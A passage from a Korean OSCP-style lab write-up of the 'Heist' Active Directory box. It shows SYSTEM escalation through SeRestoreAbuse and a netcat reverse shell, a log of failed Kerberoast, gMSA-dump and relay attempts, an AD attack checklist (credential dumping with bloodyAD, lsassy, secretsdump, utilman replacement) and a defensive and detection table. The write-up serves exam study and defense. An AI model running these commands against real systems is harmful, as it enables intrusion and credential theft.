도구가 함께 찍은 `Start-Service seclogon`은 **다음에 칠 명령을 알려주는 안내 문자열**이다. 즉 이 도구는 **`seclogon`(Secondary Logon) 서비스의 실행 경로를 내 명령으로 바꿔놓고, 그 서비스를 시작하라고 요구**한다. 서비스는 LocalSystem으로 뜨므로 페이로드가 SYSTEM으로 실행된다. — 이 도구는 Kali에 **컴파일된 `.exe`만** 있고 소스가 없어(`~/git/SeRestoreAbuse/SeRestoreAbuse.exe`) 어느 레지스트리 키를 정확히 쓰는지는 확인하지 못했다 `[가정]`.

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.165] 50227
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
b041c78918d81a4a4a15732053a1e416
PS C:\Windows\system32>
```

![[Pasted image 20260708155109.png]]

> [!warning] 리버스셸은 반드시 **tmux 세션**에서 대기시킨다
> 이 환경은 원격 Kali에 비대화식 SSH로 붙는다. 그냥 `nc -lnvp 4444`를 띄우면 SSH 명령이 끝나는 순간 리스너가 죽는다. `tmux new -s lis` 안에서 띄워라.
> `rlwrap`은 리버스셸에 **방향키·히스토리**를 붙여준다. Windows PowerShell 셸에서 특히 체감이 크다.

### 4-6. 두 경로 우열

| | A: utilman + RDP | B: SeRestoreAbuse + nc |
|---|---|---|
| 전제조건 | **`nla:False`** · RDP 3389 열림 | 없음 (WinRM만 있으면 된다) |
| 업로드 | 없음 | **2개** (`SeRestoreAbuse.exe`·`nc64.exe`) — AV 위험 |
| 남기는 흔적 | **시스템 파일 2개 이름변경** — 원복 필수 | 서비스 설정 변경 — 원복 권장 |
| 셸 품질 | GUI 콘솔 (붙여넣기 불편) | **`rlwrap` 리버스셸** — 스크립트하기 좋다 |
| 안정성 | 화면 조작이라 실패해도 즉시 안다 | 서비스 시작 타이밍에 의존 |

**시험이라면 A를 먼저 시도한다** — 업로드가 없어 AV를 건드리지 않고, 실패 판정이 즉각적이다. `nla:True`거나 3389가 막혀 있으면 B로 간다.

---

## 5. 플래그

| 플래그 | 경로 | 값 | 얻은 계정 |
|---|---|---|---|
| `local.txt` | `C:\Users\enox\Desktop\local.txt` | `a1909577c8fb09bed9a1ff474af80620` | `heist.offsec\enox` (WinRM) |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `b041c78918d81a4a4a15732053a1e416` | `NT AUTHORITY\SYSTEM` (리버스셸) |

둘 다 표준 위치다. **둘 다 대화형 셸에서 읽었다** — 웹셸 경유가 아니므로 시험 규정상 유효한 획득 방식이다.

---

## 6. 막혔던 지점 / 시행착오

`~/.zsh_history`에 남은 실제 명령을 회수해 시간순으로 재구성했다. **산출물에 없는 실패가 여기 다 있다.**

### 6-1. feroxbuster 148,104 요청 → 0건 (가장 큰 시간 낭비)

`.state` 파일이 증거다(§1-3). 62만 요청 중 24%를 돌고 중단했다.

**무엇을 잘못 봤나** — 입력창이 하나뿐인 단일 파라미터 앱을 보고도 "숨은 관리자 페이지가 있을 것"이라고 가정했다.
**어떻게 알아챘나** — 스캔이 도는 동안 `?url=`을 손으로 만져보다가 Responder에 해시가 들어왔다. **브루트포싱이 끝나기 전에 박스가 풀렸다.**
**손절선** — 워드리스트 10%(약 6만 요청)를 돌고도 200이 루트 하나뿐이면 **거기서 끊는다.** 백그라운드로 돌려두는 것은 괜찮지만 **그것을 기다리며 다른 일을 멈추면 안 된다.**

### 6-2. Kerberoasting 시도 — 두 번 실패

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ impacket-GetUserSPNs nagoya-industries.com/enox:california -dc-ip 192.168.120.165
┌──(kali㉿kali)-[~/PG/Heist]
└─$ impacket-GetUserSPNs heist.offsec/enox:california -dc-ip 192.168.120.165
```

**첫 줄은 도메인이 통째로 틀렸다** — `nagoya-industries.com`은 바로 앞에 풀던 [[Nagoya]]의 도메인이다. 히스토리에서 위로 올려 재사용하다 도메인만 안 고쳤다.

> [!danger] 박스를 연달아 풀 때 가장 흔한 오류가 **앞 박스 값의 잔류**다
> 이 세션에서만 세 종류가 났다 — 도메인(`nagoya-industries.com`), IP(`192.168.120.175` → [[Vault]] §6), 그리고 §6-3의 `.local`/`.offsec`.
> **방어책: 박스마다 디렉터리를 새로 만들고(`mkdir Heist; cd Heist`) 첫 명령으로 `nnmap`을 친다.** 그러면 `nmap.log`가 그 디렉터리의 정답 IP·도메인이 되고, 히스토리 재사용 시 대조할 기준이 생긴다.

두 번째 줄은 도메인이 맞다. 그런데도 **얻은 것이 없다.** 이유는 BloodHound가 설명한다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[].Properties | select(.hasspn==true) | .name' 20260708141821_users.json
KRBTGT@HEIST.OFFSEC
```

**SPN이 붙은 사용자 계정은 `krbtgt` 하나뿐이고, `krbtgt`는 Kerberoasting 대상이 아니다.** `svc_apache$`는 이름이 서비스 계정처럼 생겼지만 `hasspn: false`이고, 설령 SPN이 있어도 **gMSA는 120자 랜덤이라 크랙 불가**다(§2-5).

**교훈: Kerberoasting은 "SPN이 붙은 *사람이 정한 비밀번호* 계정"을 노리는 공격이다.** `$`로 끝나는 계정만 나오면 그 자리에서 접어라.

### 6-3. gMSA 덤프 — 도메인 오타로 실패

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ gMSADumper.py -u enox -p california -d heist.local
```

**`heist.local`이 아니라 `heist.offsec`이다.** nmap이 이미 `Domain: heist.offsec`·`DNS_Tree_Name: heist.offsec`으로 두 번 말해줬는데, "AD 랩은 `.local`" 이라는 습관이 이겼다.

이 명령의 실제 출력은 기록에 남지 않았다. 도메인이 존재하지 않으므로 LDAP 연결/이름 해석 단계에서 실패한다 — **구체적인 오류 문구는 관측된 것이 아니다.**

**교훈: 도메인 이름은 추측하지 말고 `nmap.log`에서 복사해 붙여라.** PG/OffSec 랩은 `.offsec`·`.com`·`.local`이 뒤섞여 있다.

### 6-4. NTLM 릴레이 시도 — 애초에 성립하지 않는 판

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ impacket-ntlmrelayx -t ldaps://192.168.120.165 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
```

`--dump-gmsa`가 있으니 발상 자체는 맞다 — "enox의 인증을 LDAPS로 릴레이해 gMSA 비밀번호를 뽑자".

**문제는 릴레이할 대상이 이 박스 하나뿐이라는 것**이다(§2-4). 인증이 오는 곳도 DC01, 릴레이 대상도 DC01. **MS16-075 이후 동일 호스트로의 NTLM 릴레이는 막혀 있다.**

`nmap.log`의 `Message signing enabled and required` 한 줄을 먼저 읽었으면 이 시도를 건너뛸 수 있었다.

**교훈: 릴레이는 "호스트가 둘 이상"일 때의 도구다.** 단일 호스트 랩에서는 크랙이나 ACL이 답이다. 시험의 AD 세트(보통 DC 1 + 멤버 2)에서는 반대로 릴레이가 강력해진다.

### 6-5. `nxc ldap --gmsa` 시도

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc ldap 192.168.120.165 -u enox -p california -d heist.offsec
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc ldap 192.168.120.165 -u enox -p california -d heist.offsec --gmsa
```

`--gmsa`는 nxc의 정식 옵션이고 이 경로 자체는 옳다. 이 두 줄의 출력은 기록에 남지 않았다 — **성공/실패를 단정할 수 없다.** 이어서 `bloodyAD`를 쳤고 그쪽이 결과를 냈다는 사실만 확정적이다.

> [!tip] gMSA 비밀번호를 읽는 도구는 최소 넷이다 — 하나 막히면 다음 것
> 1. `bloodyAD ... get object '<계정>$' --attr msDS-ManagedPassword` ← **이 박스에서 성공**
> 2. `nxc ldap <IP> -u U -p P --gmsa`
> 3. `gMSADumper.py -u U -p P -d <FQDN>`
> 4. 타겟에서 `GMSAPasswordReader.exe --accountname <계정>` ← **이 박스에서 성공** (AES 키까지 필요할 때)
>
> **넷 다 같은 LDAP 속성 하나를 읽는다.** 하나가 안 되면 구현 차이(LDAPS 강제·서명 요구·파이썬 버전)일 뿐이므로 **원리를 의심하지 말고 도구를 바꿔라.**

### 6-6. `responder -I`에 IP를 넣었다

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ sudo responder -I 192.168.45.175
┌──(kali㉿kali)-[~/PG/Heist]
└─$ sudo responder -I tun0
```

히스토리에 두 줄이 연달아 있다. `-I`는 인터페이스 이름을 받는다. 구체적 오류 문구는 기록에 없다 — **관측된 것이 아니다.** 확정적인 것은 `tun0`으로 고쳐 친 직후 §3-1의 배너가 떴다는 사실뿐이다.

### 6-7. 자격증명을 옆 박스에 던져봤다

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc-sweep 192.168.120.172 -u 'enox' -p 'california'
```

`192.168.120.172`는 **[[Vault]]** 다. `heist.offsec`의 자격증명을 `vault.offsec`에 던진 것이라 성립할 리 없다(두 랩은 서로 다른 독립 도메인이다).

**그런데 이 반사 자체는 옳다.** 시험 AD 세트는 **같은 도메인의 여러 호스트**로 구성되고, 거기서는 이 스윕이 피벗의 전부다. 판단 기준은 하나 — **같은 도메인인가.** nmap의 `DNS_Domain_Name`을 비교하면 3초에 알 수 있다.

### 6-8. Vault의 hashcat 명령이 히스토리에 없다 — 히스토리를 근거로 쓸 때의 함정

`hashcat.potfile`에는 두 박스의 결과가 모두 들어 있다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "^ANIRUDH|^ENOX" ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
california
```

그런데 `~/.zsh_history`에는 `hashcat -m 5600 hash.txt ...`가 **한 번만** 나온다. `~/.zshrc`가 답이다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "HISTSIZE|SAVEHIST|hist_" ~/.zshrc
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
```

**중복 명령이 우선적으로 만료된다.** 두 박스에서 문자열이 동일한 명령을 쳤고 한 벌이 지워진 것으로 본다 `[가정]`.

> [!warning] 히스토리는 **빠짐없는 기록이 아니다**
> - `hist_ignore_dups` — 직전과 같은 명령은 안 남는다
> - `hist_ignore_space` — **공백으로 시작한 명령은 통째로 안 남는다** (비밀번호가 들어간 명령을 이렇게 감춘다)
> - `hist_expire_dups_first` + `HISTSIZE=1000` — 파일이 커지면 중복부터 사라진다
>
> **그래서 "히스토리에 없다 = 실행하지 않았다"가 아니다.** 결과물(potfile·`.state`·`nmap.log`)과 교차해야 확정된다. 이 노트의 서술은 그 원칙으로 썼다.

### 6-9. `svc_apache$`를 잡고 나서 접은 두 경로

gMSA 해시로 셸을 얻은 직후, SYSTEM으로 가는 후보가 셋이었다. 둘은 그 자리에서 접었다.

**후보 1 — Potato 계열(PrintSpoofer/GodPotato).** `whoami /priv`(§4-3)에 **`SeImpersonatePrivilege`가 없다.** Potato 계열은 명명 파이프로 SYSTEM 토큰을 가장한 뒤 **그 토큰으로 프로세스를 만드는** 공격이라 이 특권이 전제다. 없으면 토큰을 훔쳐도 쓸 수가 없다. [[Squid]]에서 쓴 반사신경이 여기서는 즉시 죽는다. **`whoami /priv` 한 줄로 3초에 판정된다.**

**후보 2 — DCSync.** 서비스 계정이 복제 권한을 갖고 있는 랩이 흔하다. BloodHound JSON으로 확인했더니 **아니었다**:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
           | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708141821_domains.json
GetChanges	S-1-5-21-...-498	Group      # Enterprise Read-only Domain Controllers
GetChangesAll	S-1-5-21-...-516	Group      # Domain Controllers
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-32-544	Group      # Administrators
GetChanges	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesAll	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-9	Group      # Enterprise Domain Controllers
GetChanges	HEIST.OFFSEC-S-1-5-9	Group
```

**전부 기본 principal뿐이다.** `svc_apache$`(`-1105`)도, `WEB ADMINS`(`-1104`)도 없다. `impacket-secretsdump`를 던져봤자 `DRSUAPI` 권한 거부로 끝난다 — **던지기 전에 JSON 한 줄로 알 수 있었다.**

> [!tip] 도메인 객체의 ACE를 먼저 보는 습관
> `domains.json`(또는 BloodHound GUI에서 도메인 노드 → Inbound Object Control)에 **`GetChanges` + `GetChangesAll`을 동시에** 가진 비기본 principal이 있으면 그것이 DCSync 경로다. 둘 중 하나만으로는 안 된다.
> 이 확인은 **10초**고, secretsdump를 돌려 실패를 보는 것은 **1~2분 + 오판의 여지**다.

**남은 후보 3이 `SeRestorePrivilege`였고, 그것이 정답이었다.**

### 6-10. 개작하며 잡은 것 — 원본 노트의 오류 4건

이 노트는 원본(426행, 터미널 붙여넣기 위주)을 전면 개작한 것이다. 대조 과정에서 **원본 서술 자체의 오류**가 넷 나왔다. 실패 유형이 [[_WRITEUP-STANDARD]]가 경고하는 패턴과 정확히 일치해서 남겨 둔다.

| # | 원본 | 실제 | 어떻게 반증했나 |
|---|---|---|---|
| 1 | frontmatter `tech/web/lfi-rfi` | **LFI/RFI는 이 박스에 없다.** `?url=`은 서버가 원격 URL을 가져오는 **SSRF**다. 경로탐색도, 로컬 파일 포함도 발생하지 않았다 | 스크린샷의 URL(`?url=http://192.168.45.175`)과 캡처 blob의 `MsvAvTargetName = HTTP/...` |
| 2 | frontmatter `tech/ad/ntlm-relay` | **릴레이는 시도했지만 성립하지 않았다**(§6-4). 실제로 한 것은 **캡처 + 오프라인 크랙**이다 | `nmap.log`의 `Message signing enabled and required`, `computers.json`에 호스트가 1대뿐 |
| 3 | "enox의 경우 web admin 그룹이므로 svc_apache$의 hash 볼 수 있음" — **근거 없는 단정** | 결론은 맞다. 그러나 원본에는 근거가 없었고, `WEB ADMINS`의 멤버가 enox 하나라는 사실도, ACE가 `ReadGMSAPassword`라는 사실도 적혀 있지 않았다 | BloodHound JSON을 `jq`로 직접 조회(§2-6) |
| 4 | `manual_tags` 선언 없음 | 자동 태거가 본문 키워드로 기법을 판정한다. 이 노트처럼 대안 경로·비교표가 많은 글은 **쓰지도 않은 기법이 대량으로 붙는다** | 표준의 실측 사례(Crane 6→21, Squid 4→19) |

> [!danger] 2번이 특히 위험한 유형이다 — **태그가 서술을 오염시킨다**
> `tech/ad/ntlm-relay`라는 태그를 보고 다음에 이 노트를 여는 사람은 "여기서 릴레이를 했구나"라고 읽는다. 그러면 **다른 박스에서 서명이 필수인 DC에 릴레이를 시도하며 시간을 태운다.**
>
> 이 태그를 **그대로 유지하기로 결정했다.** 볼트의 태그 어휘에는 `ntlm-capture`가 없고, `tech/ad/ntlm-relay`가 사실상 "Responder/강제 인증" 버킷이기 때문이다(`extract.py`의 판정 정규식이 `responder`를 포함한다). **대신 이 노트 본문 세 곳(§2-1·§2-4·§6-4)에 "릴레이는 성립하지 않았다"를 명시**했다. 태그는 검색 색인이지 결론이 아니다.

**일반화**: 개작이 새로 써넣는 설명 문장이 가장 잘 무너진다. 실측 터미널 블록은 훼손되지 않는다. 그러니 **검증은 "이 박스에서 이랬다"는 단정과 "일반적으로 이렇다"는 승격 문장에 집중**하라. 이 노트에서 확인할 수 없었던 것들은 전부 `[가정]`을 붙였다 — §2-4의 LDAP 채널 바인딩, §2-7의 URA 부여 경로, §4-5의 SeRestoreAbuse 내부 동작, §6-8의 히스토리 만료.

### 6-11. 시간 배분 복기

| 구간 | 실제 | 적정 | 비고 |
|---|---|---|---|
| nmap 전수 | 13:56 → 13:58 (2분) | 2분 | `--min-rate 5000`의 효과 |
| 웹 열거 + feroxbuster | 13:58 → 14:08 | **3분** | 파라미터를 먼저 만졌어야 했다 |
| Responder + 캡처 | 14:08 → 14:09 (1분) | 1분 | 트리거를 알면 즉시다 |
| hashcat | 14:10 (2초) | 2초 | 12초 안에 안 되면 접는다 |
| 스윕 + WinRM + local.txt | 14:12 | 5분 | |
| BloodHound 수집·분석 | 14:18 → 15:05 | 15분 | Kerberoast·릴레이 헛발질 포함 |
| gMSA → PtH → SYSTEM | 15:05 → 15:51 | 20분 | 두 경로 모두 실습해서 길어졌다 |

**전체 약 2시간.** 낭비는 §6-1(브루트포싱)과 §6-2·6-4(경로 오판) 둘이다. **`nmap.log`를 한 번 더 정독했으면 §6-4는 통째로 없었다.**

---

## 7. OSCP 시험 관점

1. **Windows/AD 셸을 잡으면 치는 첫 5개** — 리눅스 반사신경은 여기서 전부 무용지물이다.
   ```powershell
   whoami /all                       # 사용자 SID + 그룹 + 특권 한 번에
   whoami /priv                      # ★ 이 박스의 정답이 여기 있었다
   net user <나> /domain             # 내 그룹 멤버십
   net localgroup administrators     # 로컬 관리자 명단
   systeminfo                        # 빌드·패치·도메인 가입 여부
   ```
   여기에 `Get-ChildItem C:\Users`(다른 계정 존재)와 `C:\`·`C:\Program Files` 훑기를 더한다.

2. **자격증명 하나를 얻으면 반드시 전 프로토콜·전 호스트로 스윕한다.**
   ```bash
   nxc smb   <대역> -u U -p P --shares --continue-on-success
   nxc winrm <대역> -u U -p P
   nxc rdp   <대역> -u U -p P
   nxc ldap  <IP>   -u U -p P --gmsa      # gMSA 후보 즉시 확인
   ```
   **같은 도메인인지부터 확인**한다(§6-7).

3. **이 자격증명으로 다음에 무엇을 시도하는가 — AD 피벗 체크리스트**
   1. `nxc smb <대역> -u U -p P --shares` — 읽기/쓰기 가능한 공유. 쓰기 가능하면 [[Vault]]식 `ntlm_theft`로 **다음 사용자 해시**를 낚는다
   2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC-IP> -c All` — 그래프에서 **내 계정에서 나가는 아웃바운드 엣지**만 본다
   3. `impacket-GetUserSPNs <FQDN>/U:P -dc-ip <DC>` — Kerberoast (`-m 13100`)
   4. `impacket-GetNPUsers <FQDN>/ -usersfile users.txt -no-pass -dc-ip <DC>` — AS-REP (`-m 18200`). **`-usersfile`이다, `-userfile`이 아니다** ([[Vault]] §6에서 실제로 틀렸다)
   5. `nxc ldap <DC> -u U -p P --gmsa` / `--bloodhound` — gMSA·LAPS 확인
   6. `nxc smb <대역> -u U -p P -M lsassy` — 다른 호스트에 로그온한 세션의 해시
   7. WinRM/RDP/psexec으로 셸 → `whoami /priv` → 특권 이름으로 경로 결정
   8. **SYSVOL 훑기** — `\\<DC>\SYSVOL`의 `Groups.xml`(GPP `cpassword`)·로그온 스크립트에 평문이 박혀 있는 일이 흔하다

4. **`whoami /priv`의 특권 이름 → 경로 대응표** (외워라)

   | 특권 | 경로 | 참고 노트 |
   |---|---|---|
   | `SeImpersonatePrivilege` | PrintSpoofer / GodPotato / SweetPotato | [[Squid]] |
   | `SeRestorePrivilege` | `utilman.exe` 치환 · 서비스 레지스트리 하이재킹 | **이 노트** · [[Vault]] |
   | `SeBackupPrivilege` | `ntds.dit` + `SYSTEM` 하이브 → `secretsdump` | [[Vault]] §4-6 |
   | `SeTakeOwnershipPrivilege` | 대상 파일 소유권 탈취 → DACL 재작성 | |
   | `SeDebugPrivilege` | lsass 덤프 → mimikatz | |
   | `SeLoadDriverPrivilege` | 취약 드라이버 로드 | |
   | **아무것도 없음** | 서비스 오설정·AlwaysInstallElevated·자동로그온 레지스트리로 방향 전환 | |

5. **자동 도구 없이 같은 결과를 얻는 법** (이 박스는 금지 도구를 쓰지 않았지만 반사를 만들어 둔다)
   - Responder 없이 강제 인증 수신 → `impacket-smbserver share . -smb2support` 를 띄우고 UNC를 넣는다. NetNTLMv2가 그대로 콘솔에 찍힌다
   - BloodHound 없이 ACL 확인 → `bloodyAD --host <DC> -d <도메인> -u U -p P get writable` / `get object <대상> --attr nTSecurityDescriptor`, 또는 `ldapsearch -x -H ldap://<DC> -D 'U@<도메인>' -w P -b 'DC=..,DC=..' '(sAMAccountName=*)' sAMAccountName memberOf`
   - nxc 없이 공유 열거 → `smbclient -L //<IP> -U 'U%P'` · `smbmap -H <IP> -u U -p P`

6. **리버스셸이 안 붙으면 의심할 것** — 아웃바운드 포트 제한(80/443로 바꿔본다) · Windows 방화벽 아웃바운드 규칙 · **AV가 `nc64.exe`를 파일명만으로 삭제** ([[Squid]]·[[Exghost]]에서 실제로 났다. 업로드 후 `ls`로 존재 확인부터). 이 박스는 4444가 그대로 통했다.

7. **시간 배분** — AD 박스는 **정찰 10분 · 진입 30분 · 그래프 15분 · 권한상승 30분**을 기준선으로 잡는다. 웹 브루트포싱은 **백그라운드**로만 돌리고 그것을 기다리지 않는다(§6-1). 진입 경로가 60분 넘게 안 보이면 다른 박스로 옮겼다가 돌아온다.

8. **시험 증거** — 플래그마다 `whoami; hostname; ipconfig` 를 **같은 화면**에 담는다. AD 박스는 `local.txt`(사용자)와 `proof.txt`(Administrator/SYSTEM)가 따로이므로 **두 번** 찍는다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| 웹앱이 임의 URL을 서버측에서 페치 | **아웃바운드 목적지 허용목록.** 내부/사설 대역(RFC1918)·링크로컬로 나가는 요청 차단. 페치 프로세스를 **네트워크 자격증명이 없는 저권한 계정**으로 실행 |
| 페치 프로세스가 도메인 사용자 컨텍스트로 실행 | 서비스 계정 분리. `NT AUTHORITY\NETWORK SERVICE` 등 도메인 인증을 못 하는 계정으로 |
| NTLM이 아무 서버에나 자동 인증 | GPO **"Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers = Deny all"**. 인트라넷 존을 신뢰 사이트로 좁힌다 |
| `enox`의 비밀번호가 `california` | 비밀번호 정책 강화 + **유출 비밀번호 사전 차단**(Azure AD Password Protection 등). 강제 인증을 당해도 크랙이 안 되면 이 박스는 끝난다 |
| LLMNR/NBT-NS/mDNS 응답 | 세 프로토콜 전부 GPO로 비활성. 이 박스의 트리거는 아니었지만 같은 도구가 훨씬 넓은 면적을 판다 |
| `WEB ADMINS`가 gMSA 비밀번호 읽기 가능 | `msDS-GroupMSAMembership`을 **해당 서비스를 실제로 실행하는 호스트 계정만**으로 좁힌다. 사람 그룹을 넣지 않는다 |
| `svc_apache$`가 `SeRestorePrivilege` 보유 | User Rights Assignment 재검토. 서비스 계정에 백업/복원 특권은 **거의 항상 과잉**이다 |
| DC에 RDP + **NLA 비활성** | NLA 강제(`SecurityLayer=2`, `UserAuthentication=1`). DC RDP는 관리 네트워크로만 |
| 접근성 도구 치환 | **Sticky Keys/Utilman 치환 탐지** — `System32`의 접근성 바이너리 무결성 모니터링(파일 감사 정책 + Sysmon EventID 11) |

**탐지 관점**: Event ID **4624/4625 Logon Type 3 + NTLM**이 외부 IP로 나가는 흐름, `System32` 내 파일 이름변경(4663), 서비스 ImagePath 변경(7045/4657), gMSA 비밀번호 조회(4662 + `msDS-ManagedPassword` GUID). **마지막 항목은 정상 운영에서는 호스트 계정만 발생시킨다 — 사람 계정이 찍히면 즉시 알람이다.**

---

## 9. 참고 자료

- **CVE 없음** — 이 박스는 취약한 소프트웨어 버전이 아니라 **설정과 ACL**만으로 뚫린다. 그래서 `cves: []` · `manual_cves: true`다
- [MS-NLMP: NTLM 인증 프로토콜](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/) — NetNTLMv2 blob·AV_PAIR 구조(§2-2·§2-3의 근거)
- [MS-GKDI / gMSA 개요](https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) — `msDS-ManagedPassword`·KDS root key
- [Responder](https://github.com/lgandx/Responder) · [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) (SMB 트리거는 [[Vault]])
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) · [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) — 이 박스에서는 `~/git/Toolies/`의 컴파일본을 사용
- [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse) `[가정]` — Kali에는 [Compiled-Binaries](https://github.com/AlexLinov/Compiled-Binaries) 저장소의 `.exe`만 있어 원 저장소를 대조하지 못했다
- [hashcat 모드 목록](https://hashcat.net/wiki/doku.php?id=example_hashes) — 본문 표는 `hashcat -hh` 실행 결과다
- [OSCP Exam Guide — Exam Proofs](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — 웹셸 플래그 0점 규정

## 남긴 흔적

랩 정리 시 되돌려야 할 것:

- `C:\Windows\System32\utilman.exe` → `cmd.exe`로 치환됨, 원본은 `utilman.old`
- `C:\Users\enox\Documents\reader.exe` (GMSAPasswordReader)
- `C:\Users\svc_apache$\Desktop\SeRestoreAbuse.exe` · `nc64.exe`
- `seclogon` 서비스 설정 변경 (SeRestoreAbuse가 남긴 레지스트리)
- Kali: `~/PG/Heist/` — `nmap.log` · `hash.txt` · BloodHound JSON 7종 · feroxbuster `.state`

## 관련 노트

- [[Vault]] — **같은 세션에 푼 자매 박스.** 같은 NetNTLMv2 캡처 → 크랙 → WinRM → `SeRestorePrivilege` 구조인데 **트리거가 SMB(`cifs/...`)이고 권한상승이 GPO ACL이다.** 두 노트를 붙여 읽으면 "강제 인증의 두 얼굴"이 보인다
- [[Butch]] — ⚠️ **웹셸로 읽은 플래그는 0점.** 대화형 셸에서 읽어야 하는 규정의 근거
- [[Squid]] — Windows 특권 모델의 다른 갈래. `SeImpersonatePrivilege` → Potato. **이 박스에는 그 특권이 없어 다른 길로 갔다**
- [[Resourced]] — AD·Kerberos 시계 동기(`ntpdate`)와 ccache 취급
- [[Nagoya]] — 같은 세션의 다른 AD 박스. **§6-2의 도메인 오타가 이 박스 값의 잔류였다.** 티켓 위조(`impacket-ticketer`)·`net rpc password` 사례
- [[Hutch]] — AD 열거·ACL 악용 계열
- [[Exghost]] — "워드리스트에 없는 이름은 브루트포싱으로 못 찾는다"(§6-1과 같은 교훈)
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
